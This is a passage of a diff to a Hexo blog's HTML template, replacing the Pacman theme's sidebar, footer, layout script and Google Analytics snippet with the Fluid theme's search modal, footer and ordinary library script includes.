-			<li><a href="/tags/git密钥生成以及安装/" title="git密钥生成以及安装">git密钥生成以及安装<sup>1</sup></a></li>
-		
-		</ul>
-</div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
 
-
-</aside>
-</div>
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-    <footer><div id="footer" >
-	
-	<div class="line">
-		<span></span>
-		<div class="author"></div>
-	</div>
-	
-	
-	<div class="social-font clearfix">
-		
-		
-		
-		
-		
-	</div>
-		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2019 
-		
-		<a href="http://L0yy.github.io" target="_blank" title="Cray">Cray</a>
-		
-		</p>
+  </div>
 </div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
+  </div>
 </footer>
-    <script src="/js/jquery-2.1.0.min.js"></script>
-<script type="text/javascript">
-$(document).ready(function(){ 
-  $('.navbar').click(function(){
-    $('header nav').toggleClass('shownav');
-  });
-  var myWidth = 0;
-  function getSize(){
-    if( typeof( window.innerWidth ) == 'number' ) {
-      myWidth = window.innerWidth;
-    } else if( document.documentElement && document.documentElement.clientWidth) {
-      myWidth = document.documentElement.clientWidth;
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
     };
-  };
-  var m = $('#main'),
-      a = $('#asidepart'),
-      c = $('.closeaside'),
-      o = $('.openaside');
-  $(window).resize(function(){
-    getSize(); 
-    if (myWidth >= 1024) {
-      $('header nav').removeClass('shownav');
-    }else
-    {
-      m.removeClass('moveMain');
-      a.css('display', 'block').removeClass('fadeOut');
-      o.css('display', 'none');
-        
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
     }
-  });
-  c.click(function(){
-    a.addClass('fadeOut').css('display', 'none');
-    o.css('display', 'block').addClass('fadeIn');
-    m.addClass('moveMain');
-  });
-  o.click(function(){
-    o.css('display', 'none').removeClass('beforeFadeIn');
-    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
-    m.removeClass('moveMain');
-  });
-  $(window).scroll(function(){
-    o.css("top",Math.max(80,260-$(this).scrollTop()));
-  });
-});
-</script>
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $('#post').find('img').each(
+      function () {
+        var _this = $(this);
+        var _src = _this.attr("src");
+        _this.wrap('<a data-fancybox="images" href="' + _src + '" ></a>');
+      }
+    );
+  </script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
 
 
 
 
-
-
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-ga('create', 'UA-146435492-1', 'l0yy.github.io');  
-ga('send', 'pageview');
-</script>
-
-
-  </body>
- </html>
+</body>
+</html>
